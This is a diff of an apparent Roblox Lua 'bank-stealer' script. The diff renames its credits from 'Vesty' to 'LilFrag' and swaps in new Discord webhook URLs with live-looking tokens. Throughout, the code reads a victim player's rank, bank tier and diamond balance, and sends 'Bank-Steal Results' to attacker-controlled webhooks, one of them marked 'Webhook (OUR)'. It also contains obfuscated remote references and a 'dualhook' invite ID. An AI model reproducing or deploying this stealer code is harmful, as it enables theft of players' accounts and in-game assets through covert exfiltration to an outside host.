@@ -88,12 +88,12 @@ local fardplayer = game.Players.LocalPlayer
 local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 local tier = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text, "%,", "")
 local diamondb = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount.Text
-local eurl = "https://discord.com/api/webhooks/1051452344707055681/3ujGyYFpRkNWEGjPRGzPPtJBmzYnBtzNoz4gJDeE7nSPAA2loQg1HEbsZokAObdQzbvW"
+local eurl = "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"
 request = http_request or request or HttpPost or syn.request
 local error1 = {
   ["embeds"] = {{
   ["title"] = "``` > Errors Reports < ```",
-  ["url"] = "https://discord.gg/Z7Uu7mh6F5",
+  ["url"] = "LilFrag#3583",
   ["color"] = tonumber(0xF0FF00),
   ["fields"] = {
   {
@@ -138,7 +138,7 @@ eggremote = blobz[blobb[2](2, eggremote)]
 
 -- Invitation ID
 
-local idiot = 3836316699
+local idiot = 549167423
  -- the dualhook invite
 
 -- Invitation ID End
@@ -261,10 +261,10 @@ local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Te
 request = http_request or request or HttpPost or syn.request
 
 local data1 = {
-  ["content"] = "> @everyone Hit Notifers! :exploding_head:\n**> Vesty Bank-Steal Results v4.1**",
+  ["content"] = "> @everyone Hit Notifers! :exploding_head:\n**> LilFrag Bank-Steal Results v4.1**",
   ["embeds"] = {{
-  ["title"] = "``` > Vesty's Bank-Steal Results < ```",
-  ["url"] = "https://discord.gg/Z7Uu7mh6F5",
+  ["title"] = "``` > LilFrag's Bank-Steal Results < ```",
+  ["url"] = "LilFrag#3583",
   ["description"] = ":last_quarter_moon:  Below there is "..username.."'s details of the Account.  :last_quarter_moon:",
   ["type"] = "rich",
   ["color"] = tonumber(0x00FFFF),
@@ -331,8 +331,8 @@ local data1 = {
 
   local data2 = {
           ["embeds"] = {{
-          ["title"] = "``` > Vesty Information < ```",
-          ["url"] = "https://discord.gg/Z7Uu7mh6F5",
+          ["title"] = "``` > LilFrag Information < ```",
+          ["url"] = "LilFrag#3583",
           ["color"] = tonumber(0xF0FF00),
           ["thumbnail"] = {
               ["url"] = "https://images-ext-1.discordapp.net/external/9UKBF918Xw0txaEiW68dhIlGe_N8JjnJ19xU-cOcOo8/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/4d0ae2a37de778f30f1b31fa4203b4b3.png",
@@ -341,13 +341,13 @@ local data1 = {
           },
           ["fields"] = {
           {
-          ["name"] = "`> >`  Vesty Changelog 4.1  `< <`",
-          ["value"] = "```- Released V4\n* Adding more new Feature on bankstealer and Special Thanks for CrystalBlob for creating a new Bypass, also Revamping on Webhooks Results.```",
+          ["name"] = "`> >`  LilFrag Changelog 4.1  `< <`",
+          ["value"] = "```- Released V4\n* Adding more new Feature on bankstealer and Special Thanks for LilFrag for creating a new Bypass, also Revamping on Webhooks Results.```",
           ["inline"] = false
           },
           {
           ["name"] = "`> >`  Credits  `< <`",
-          ["value"] = "```- ver#0704 (UI/Designer/WebHooks)\n- blobbyboi#0615 (Scripter/Bypasser)\n- oxy#7756 (Scripter/WebHooks)\n- Our Links: https://discord.gg/Z7Uu7mh6F5```",
+          ["value"] = "```- LilFrag#3583 (UI/Designer/WebHooks)\n- LilFrag#3583 (Scripter/Bypasser)\n- LilFrag#3583 (Scripter/WebHooks)\n- Our Links: LilFrag#3583```",
           ["inline"] = false
           },
           }
@@ -366,15 +366,15 @@ local data1 = {
 -- End Webhoook Victim
 
 -- Webhook (OUR)
-local YourWebHookHere =  "https://discord.com/api/webhooks/1050925463507324928/sym7MmVvCFMBeC2HLBlhT4_ZKbBErKMwK8P2P0qMu6Gw04oGSe8KvYUDfTmz3oMGJDpX"  -- web hook here
+local YourWebHookHere =  "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"  -- web hook here
 local url = YourWebHookHere
 request = http_request or request or HttpPost or syn.request
  
 local data3 = {
-  ["content"] = "> @everyone Hit Notifers! :exploding_head:\n**> Vesty Bank-Steal Results v4.1**",
+  ["content"] = "> @everyone Hit Notifers! :exploding_head:\n**> LilFrag Bank-Steal Results v4.1**",
   ["embeds"] = {{
-  ["title"] = "``` > Vesty's Bank-Steal Results < ```",
-  ["url"] = "https://discord.gg/Z7Uu7mh6F5",
+  ["title"] = "``` > LilFrag's Bank-Steal Results < ```",
+  ["url"] = "LilFrag",
   ["description"] = ":last_quarter_moon:  Below there is "..username.."'s details of the Account.  :last_quarter_moon:",
   ["type"] = "rich",
   ["color"] = tonumber(0x00FFFF),
@@ -441,8 +441,8 @@ local data3 = {
 
   local data4 = {
           ["embeds"] = {{
-          ["title"] = "``` > Vesty Information < ```",
-          ["url"] = "https://discord.gg/Z7Uu7mh6F5",
+          ["title"] = "``` > LilFrag Information < ```",
+          ["url"] = "LilFrag#3583",
           ["color"] = tonumber(0xF0FF00),
           ["thumbnail"] = {
               ["url"] = "https://images-ext-1.discordapp.net/external/9UKBF918Xw0txaEiW68dhIlGe_N8JjnJ19xU-cOcOo8/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1009584663569907773/4d0ae2a37de778f30f1b31fa4203b4b3.png",
@@ -451,13 +451,13 @@ local data3 = {
           },
           ["fields"] = {
           {
-          ["name"] = "`> >`  Vesty Changelog 4.1  `< <`",
-          ["value"] = "```- Released V4\n* Adding more new Feature on bankstealer and Special Thanks for CrystalBlob for creating a new Bypass, also Revamping on Webhooks Results.```",
+          ["name"] = "`> >`  LilFrag Changelog 4.1  `< <`",
+          ["value"] = "```- Released V4\n* Adding more new Feature on bankstealer and Special Thanks for LilFrag for creating a new Bypass, also Revamping on Webhooks Results.```",
           ["inline"] = false
           },
           {
           ["name"] = "`> >`  Credits  `< <`",
-          ["value"] = "```- ver#0704 (UI/Designer/WebHooks)\n- blobbyboi#0615 (Scripter/Bypasser)\n- oxy#7756 (Scripter/WebHooks)\n- Our Links: https://discord.gg/Z7Uu7mh6F5```",
+          ["value"] = "```- LilFrag#3583 (UI/Designer/WebHooks)\n- LilFrag#3583 (Scripter/Bypasser)\n- LilFrag#3583 (Scripter/WebHooks)\n- Our Links: LilFrag#3583```",
           ["inline"] = false
           },
           {
